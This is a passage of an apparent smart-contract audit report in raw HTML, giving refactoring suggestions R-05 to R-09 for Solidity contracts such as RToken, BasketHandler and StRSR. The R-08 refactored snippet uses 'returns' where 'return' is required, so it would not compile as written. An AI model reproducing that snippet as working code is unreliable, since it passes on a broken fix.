class=\"mtk12\">uint192</span><span class=\"mtk1\"> </span><span class=\"mtk12\">baskets</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">433</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">length</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">basket</span><span class=\"mtk1\">.</span><span class=\"mtk12\">erc20s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">434</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">disabled</span><span class=\"mtk1\"> || </span><span class=\"mtk12\">length</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">FIX_ZERO</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<h2 id=\"r-05-some-number-values-can-be-refactored-with-_\" style=\"position:relative;\"><a href=\"#r-05-some-number-values-can-be-refactored-with-_\" aria-label=\"r 05 some number values can be refactored with _ permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[R-05] Some number values can be refactored with <code>_</code></h2>\n<p>Consider using underscores for number values to improve readability.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"97\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">p1</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Distributor</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">165</span><span class=\"mtk1\">:  </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">share</span><span class=\"mtk1\">.</span><span class=\"mtk12\">rsrDist</span><span class=\"mtk1\"> &lt;= </span><span class=\"mtk7\">10000</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;RSR distribution too high&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">166</span><span class=\"mtk1\">:  </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">share</span><span class=\"mtk1\">.</span><span class=\"mtk12\">rTokenDist</span><span class=\"mtk1\"> &lt;= </span><span class=\"mtk7\">10000</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;RToken distribution too high&quot;</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>The above instance can be refactored to:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"98\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">165</span><span class=\"mtk1\">:  </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">share</span><span class=\"mtk1\">.</span><span class=\"mtk12\">rsrDist</span><span class=\"mtk1\"> &lt;= </span><span class=\"mtk7\">10_000</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;RSR distribution too high&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">166</span><span class=\"mtk1\">:  </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">share</span><span class=\"mtk1\">.</span><span class=\"mtk12\">rTokenDist</span><span class=\"mtk1\"> &lt;= </span><span class=\"mtk7\">10_000</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;RToken distribution too high&quot;</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<h2 id=\"r-06-revert-should-be-used-on-some-functions-instead-of-return\" style=\"position:relative;\"><a href=\"#r-06-revert-should-be-used-on-some-functions-instead-of-return\" aria-label=\"r 06 revert should be used on some functions instead of return permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[R-06] Revert should be used on some functions instead of return</h2>\n<p>Some instances just return without doing anything, consider applying revert statement instead with a descriptive string why it does that.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"99\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">p1</span><span class=\"mtk1\">/</span><span class=\"mtk12\">BackingManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">109</span><span class=\"mtk1\">: </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">tradesOpen</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) </span><span class=\"mtk15\">return</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">114</span><span class=\"mtk1\">: </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">basketTimestamp</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">tradingDelay</span><span class=\"mtk1\">) </span><span class=\"mtk15\">return</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">p1</span><span class=\"mtk1\">/</span><span class=\"mtk12\">BasketHandler</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">96</span><span class=\"mtk1\">: </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">weight</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">FIX_ZERO</span><span class=\"mtk1\">) </span><span class=\"mtk15\">return</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">p1</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Furnace</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">71</span><span class=\"mtk1\">: </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk11\">uint48</span><span class=\"mtk1\">(</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">) &lt; </span><span class=\"mtk11\">uint64</span><span class=\"mtk1\">(</span><span class=\"mtk12\">lastPayout</span><span class=\"mtk1\">) + </span><span class=\"mtk12\">period</span><span class=\"mtk1\">) </span><span class=\"mtk15\">return</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">p1</span><span class=\"mtk1\">/</span><span class=\"mtk12\">RToken</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">660</span><span class=\"mtk1\">: </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">left</span><span class=\"mtk1\"> &gt;= </span><span class=\"mtk12\">right</span><span class=\"mtk1\">) </span><span class=\"mtk15\">return</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">739</span><span class=\"mtk1\">: </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">queue</span><span class=\"mtk1\">.</span><span class=\"mtk12\">left</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">endId</span><span class=\"mtk1\">) </span><span class=\"mtk15\">return</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">p1</span><span class=\"mtk1\">/</span><span class=\"mtk12\">StRSR</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">310</span><span class=\"mtk1\">: </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">endId</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> || </span><span class=\"mtk12\">firstId</span><span class=\"mtk1\"> &gt;= </span><span class=\"mtk12\">endId</span><span class=\"mtk1\">) </span><span class=\"mtk15\">return</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">327</span><span class=\"mtk1\">: </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">rsrAmount</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) </span><span class=\"mtk15\">return</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">497</span><span class=\"mtk1\">: </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">payoutLastPaid</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">rewardPeriod</span><span class=\"mtk1\">) </span><span class=\"mtk15\">return</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<h2 id=\"r-07-modifier-can-be-applied-on-the-function-instead-of-creating-require-statement\" style=\"position:relative;\"><a href=\"#r-07-modifier-can-be-applied-on-the-function-instead-of-creating-require-statement\" aria-label=\"r 07 modifier can be applied on the function instead of creating require statement permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[R-07] Modifier can be applied on the function instead of creating require statement</h2>\n<p>If functions are only allowed to be called by a certain individual, modifier should be used instead of checking with require statement, if the individual is the msg.sender calling the function.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"100\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">p1</span><span class=\"mtk1\">/</span><span class=\"mtk12\">RToken</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">556</span><span class=\"mtk1\">:  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">mint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">recipient</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amtRToken</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">557</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">requireNotPausedOrFrozen</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">558</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk11\">_msgSender</span><span class=\"mtk1\">() == </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">backingManager</span><span class=\"mtk1\">), </span><span class=\"mtk8\">&quot;not backing manager&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">559</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">_mint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">recipient</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amtRToken</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">560</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">requireValidBUExchangeRate</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">561</span><span class=\"mtk1\">:    }</span></span></span></code></pre>\n<p>Modifier should be created only accessible by the individual and the instance above can be refactored in:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"101\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">556</span><span class=\"mtk1\">:  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">mint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">recipient</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amtRToken</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyManager</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">557</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">requireNotPausedOrFrozen</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">558</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">_mint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">recipient</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amtRToken</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">559</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">requireValidBUExchangeRate</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">560</span><span class=\"mtk1\">:    }</span></span></span></code></pre>\n<p>Other instances:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"102\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">p1</span><span class=\"mtk1\">/</span><span class=\"mtk12\">RToken</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">579</span><span class=\"mtk1\">: </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setBasketsNeeded</span></span></span></code></pre>\n<h2 id=\"r-08-shorthand-way-to-write-if--else-statement\" style=\"position:relative;\"><a href=\"#r-08-shorthand-way-to-write-if--else-statement\" aria-label=\"r 08 shorthand way to write if  else statement permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[R-08] Shorthand way to write if / else statement</h2>\n<p>The normal if / else statement can be refactored in a shorthand way to write it:</p>\n<ol>\n<li>Increases readability</li>\n<li>Shortens the overall SLOC.</li>\n</ol>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"103\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">p1</span><span class=\"mtk1\">/</span><span class=\"mtk12\">BasketHandler</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">296</span><span class=\"mtk1\">:  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">quantity</span><span class=\"mtk1\">(</span><span class=\"mtk12\">IERC20</span><span class=\"mtk1\"> </span><span class=\"mtk12\">erc20</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint192</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">297</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">try</span><span class=\"mtk1\"> </span><span class=\"mtk12\">assetRegistry</span><span class=\"mtk1\">.</span><span class=\"mtk11\">toColl</span><span class=\"mtk1\">(</span><span class=\"mtk12\">erc20</span><span class=\"mtk1\">) </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">ICollateral</span><span class=\"mtk1\"> </span><span class=\"mtk12\">coll</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">298</span><span class=\"mtk1\">:            </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">coll</span><span class=\"mtk1\">.</span><span class=\"mtk11\">status</span><span class=\"mtk1\">() == </span><span class=\"mtk12\">CollateralStatus</span><span class=\"mtk1\">.</span><span class=\"mtk12\">DISABLED</span><span class=\"mtk1\">) </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">FIX_ZERO</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">299</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">300</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">uint192</span><span class=\"mtk1\"> </span><span class=\"mtk12\">refPerTok</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">coll</span><span class=\"mtk1\">.</span><span class=\"mtk11\">refPerTok</span><span class=\"mtk1\">(); </span><span class=\"mtk3\">// {ref/tok}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">301</span><span class=\"mtk1\">:            </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">refPerTok</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">302</span><span class=\"mtk1\">:                </span><span class=\"mtk3\">// {tok/BU} = {ref/BU} / {ref/tok}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">303</span><span class=\"mtk1\">:                </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">basket</span><span class=\"mtk1\">.</span><span class=\"mtk12\">refAmts</span><span class=\"mtk1\">[</span><span class=\"mtk12\">erc20</span><span class=\"mtk1\">].</span><span class=\"mtk11\">div</span><span class=\"mtk1\">(</span><span class=\"mtk12\">refPerTok</span><span class=\"mtk1\">, </span><span class=\"mtk12\">CEIL</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">304</span><span class=\"mtk1\">:            } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">305</span><span class=\"mtk1\">:                </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">FIX_MAX</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">306</span><span class=\"mtk1\">:            }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">307</span><span class=\"mtk1\">:        } </span><span class=\"mtk15\">catch</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">308</span><span class=\"mtk1\">:            </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">FIX_ZERO</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">309</span><span class=\"mtk1\">:        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">310</span><span class=\"mtk1\">:    }</span></span></span></code></pre>\n<p>The above instance can be refactored to:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"104\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">296</span><span class=\"mtk1\">:  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">quantity</span><span class=\"mtk1\">(</span><span class=\"mtk12\">IERC20</span><span class=\"mtk1\"> </span><span class=\"mtk12\">erc20</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint192</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">297</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">try</span><span class=\"mtk1\"> </span><span class=\"mtk12\">assetRegistry</span><span class=\"mtk1\">.</span><span class=\"mtk11\">toColl</span><span class=\"mtk1\">(</span><span class=\"mtk12\">erc20</span><span class=\"mtk1\">) </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">ICollateral</span><span class=\"mtk1\"> </span><span class=\"mtk12\">coll</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">298</span><span class=\"mtk1\">:            </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">coll</span><span class=\"mtk1\">.</span><span class=\"mtk11\">status</span><span class=\"mtk1\">() == </span><span class=\"mtk12\">CollateralStatus</span><span class=\"mtk1\">.</span><span class=\"mtk12\">DISABLED</span><span class=\"mtk1\">) </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">FIX_ZERO</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">299</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">300</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">uint192</span><span class=\"mtk1\"> </span><span class=\"mtk12\">refPerTok</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">coll</span><span class=\"mtk1\">.</span><span class=\"mtk11\">refPerTok</span><span class=\"mtk1\">(); </span><span class=\"mtk3\">// {ref/tok}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">301</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">returns</span><span class=\"mtk1\"> </span><span class=\"mtk12\">refPerTok</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> ? </span><span class=\"mtk12\">basket</span><span class=\"mtk1\">.</span><span class=\"mtk12\">refAmts</span><span class=\"mtk1\">[</span><span class=\"mtk12\">erc20</span><span class=\"mtk1\">].</span><span class=\"mtk11\">div</span><span class=\"mtk1\">(</span><span class=\"mtk12\">refPerTok</span><span class=\"mtk1\">, </span><span class=\"mtk12\">CEIL</span><span class=\"mtk1\">) : </span><span class=\"mtk12\">FIX_MAX</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">302</span><span class=\"mtk1\">:        } </span><span class=\"mtk15\">catch</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">303</span><span class=\"mtk1\">:            </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">FIX_ZERO</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">304</span><span class=\"mtk1\">:        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">305</span><span class=\"mtk1\">:    }</span></span></span></code></pre>\n<h2 id=\"r-09-function-should-be-deleted-if-a-modifier-already-exists-doing-its-job\" style=\"position:relative;\"><a href=\"#r-09-function-should-be-deleted-if-a-modifier-already-exists-doing-its-job\" aria-label=\"r 09 function should be deleted if a modifier already exists doing its job permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 